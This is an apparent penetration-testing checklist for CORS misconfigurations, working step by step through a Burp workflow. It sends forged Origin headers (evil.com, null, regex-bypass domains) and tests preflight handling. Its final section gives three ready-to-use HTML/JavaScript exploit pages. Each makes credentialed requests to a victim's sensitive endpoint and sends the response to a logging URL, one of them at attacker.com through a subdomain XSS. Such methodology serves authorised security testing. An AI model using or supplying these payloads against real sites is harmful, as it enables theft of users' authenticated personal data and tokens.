
# CORS Testing Checklist

> **Phase:** Post-recon. Subdomain enumeration and full traffic crawl are assumed complete. All requests are captured in Burp.

---

## Step 1 — Identify Candidate Requests

- [ ] In Burp Proxy history, filter responses for `Access-Control-Allow-Credentials: true`
  - **Burp filter:** Proxy → HTTP history → Filter → Response header contains `Access-Control-Allow-Credentials: true`
  - **CLI (Burp XML export):** `grep -B20 'Access-Control-Allow-Credentials: true' burp-export.xml | grep -E 'url|Host'`
- [ ] From that shortlist, keep only requests that **require authentication** (session cookie present) **AND return sensitive user data** (PII, tokens, account details, roles, etc.)
- [ ] For each candidate, note the endpoint URL, HTTP method, and what sensitive data is returned

> These are your test targets. Everything below runs against each one.

---

## Step 2 — Test for Basic Origin Reflection

- [ ] Replay the request in Burp Repeater with:

```http
Origin: https://evil.com
```

- [ ] Confirm vulnerability if the response contains **both**:

```http
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

---

## Step 3 — Test for Trusted Null Origin

- [ ] Replay the request with:

```http
Origin: null
```

- [ ] Confirm vulnerability if the response contains **both**:

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

---

## Step 4 — Test for Trusted Insecure Protocols (Subdomain Trust)

- [ ] Replay the request with an HTTP subdomain origin:

```http
Origin: http://subdomain.target.com
```

- [ ] Confirm vulnerability if the subdomain is reflected in `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`
- [ ] Try multiple subdomains from your recon list to map which are trusted
- [ ] Check if any trusted subdomain has an XSS vulnerability — required to weaponize this variant

---

## Step 5 — Test for Origin Regex Bypass

These target weak server-side regex validation. For each, check if the origin is reflected back with `Access-Control-Allow-Credentials: true`.

| Bypass Variant | Payload | Targets |
|---|---|---|
| Prefix escape | `Origin: https://evil-target.com` | Unanchored start: `.*target\.com` |
| Suffix escape | `Origin: https://target.com.evil.com` | Unanchored end: `target\.com.*` |
| Unescaped dot | `Origin: https://targetXcom.evil.com` | Unescaped dot: `target.com` |
| Trailing dot | `Origin: https://target.com.` | Some parsers strip trailing dots before validation |
| Port variation | `Origin: https://target.com:8080` | Validation ignores non-standard ports |

- [ ] Prefix escape — attacker owns `evil-target.com`
- [ ] Suffix escape — attacker owns `target.com.evil.com`
- [ ] Unescaped dot — attacker owns `targetXcom.evil.com`
- [ ] Trailing dot
- [ ] Port variation

---

## Step 6 — Test Preflight (OPTIONS) Handling

Run this for non-simple requests (custom headers, `PUT`/`PATCH`/`DELETE`, `Content-Type: application/json`).

- [ ] Send an OPTIONS request:

```http
OPTIONS /sensitive-endpoint HTTP/1.1
Host: target.com
Origin: https://evil.com
Access-Control-Request-Method: GET
Access-Control-Request-Headers: Authorization
```

- [ ] Flag as vulnerable if the preflight response reflects the attacker origin AND the actual request also reflects it — both must be true for exploitability
- [ ] Note any inconsistency where preflight returns a wildcard but the actual request restricts — not directly exploitable but worth documenting

---

## Step 7 — Exploitation

Use the appropriate payload based on which test succeeded above.

### Basic Origin Reflection / Regex Bypass

```html
<html>
  <body>
    <script>
      var xhr = new XMLHttpRequest();
      var url = "https://target.com";

      xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE) {
          fetch("/log?key=" + xhr.responseText);
        }
      }

      xhr.open('GET', url + "/sensitive-endpoint", true);
      xhr.withCredentials = true;
      xhr.send(null);
    </script>
  </body>
</html>
```

### Null Origin

```html
<html>
  <body>
    <iframe style="display: none;" sandbox="allow-scripts" srcdoc="
      <script>
        var xhr = new XMLHttpRequest();
        var url = 'https://target.com';

        xhr.onreadystatechange = function() {
          if (xhr.readyState == XMLHttpRequest.DONE) {
            fetch('/log?key=' + xhr.responseText);
          }
        }

        xhr.open('GET', url + '/sensitive-endpoint', true);
        xhr.withCredentials = true;
        xhr.send(null);
      <\/script>
    "></iframe>
  </body>
</html>
```

### Subdomain Trust + XSS

```html
<script>
  document.location="http://vulnerable-subdomain.target.com/?param=<script>
    var xhr = new XMLHttpRequest();
    var url = 'https://target.com';
    xhr.onreadystatechange = function() {
      if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch('https://attacker.com/log?key=' %2b xhr.responseText);
      }
    };
    xhr.open('GET', url %2b '/sensitive-endpoint', true);
    xhr.withCredentials = true;
    xhr.send(null);
  %3c/script>"
</script>
```

---

## Notes

<!-- Add target-specific findings, edge cases, and observations here -->
